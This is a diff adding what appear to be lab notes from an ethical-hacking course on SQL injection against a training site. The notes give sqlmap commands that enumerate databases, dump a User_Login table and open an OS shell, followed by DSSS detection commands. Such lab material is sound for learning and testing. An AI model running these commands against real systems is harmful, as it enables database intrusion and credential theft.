@@ -1,0 +1,28 @@
+Perform SQL injection attacks
+
+Perform an SQL injection attack on an MSSQL database
+Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+Detect SQL injection vulnerabilities using various SQL injection detection tools
+
+Detect SQL injection vulnerabilities using DSSS
+Detect SQL injection vulnerabilities using OWASP ZAP
+
+------------------------
+
+Perform an SQL Injection Attack on an MSSQL Database
+
+
+Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap
+	• sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs and press Enter.
+	•  -u specifies the target URL (the one you noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases.
+	•  sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables
+	• -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.
+
+	• sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump and press Enter to dump all the User_Login table content.
+
+	• sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell 
+	• --os-shell is the prompt for an interactive OS shell.
+
+	• python3 dsss.py and press Enter to view a list of available options in the DSSS application
+	• python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 11]" 
+
